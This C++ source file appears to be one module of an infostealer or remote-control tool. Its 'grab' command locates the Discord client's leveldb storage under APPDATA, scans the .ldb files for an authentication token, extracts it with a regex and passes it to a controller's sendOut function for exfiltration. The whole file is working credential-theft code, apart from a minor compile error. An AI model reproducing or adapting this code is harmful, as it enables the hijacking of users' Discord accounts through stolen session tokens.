#include "commands.h"

#include <iostream>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <regex>
#include <vector>

using namespace std;

int discordCommand(Controller *ctrl, DiscordCommand cmd) {
	if (cmd == DiscordCommand::check) {
		string discordPath = getenv("APPDATA");
		discordPath += "/discord";
		return !(filesystem::exists(discordPath) &&
				 filesystem::is_directory(discordPath));
	} else if (cmd == DiscordCommand::grab) {
		string discordPath = getenv("APPDATA");
		discordPath += "/discord";
		if (!(filesystem::exists(discordPath) &&
			  filesystem::is_directory(discordPath))) {
			return -1;
		}
		try {
			discordPath += "/Local Storage/leveldb";
			for (auto &p : filesystem::directory_iterator(discordPath)) {
				if (p.path().extension() == ".ldb") {
					ifstream file(p.path(), ios::binary);
					ostringstream buf;
					buf << file.rdbuf();
					string contents = buf.str();
					int idx = contents.find("oken");
					if (idx != string::npos) {
						regex findIt("\"[A-Za-z0-9\\.\\_\\-]+\"");
						smatch sm;
						string& subcontents = contents.substr(idx);
						if (regex_search(subcontents, sm, findIt)) {
							ctrl->sendOut(sm.str());
							return 0;
						}
					}
				}
			}
			return 1;
		} catch (filesystem::filesystem_error &ex) {
			ctrl->sendErr(ex.what());
			return -2;
		}
	}

	return -3;
}
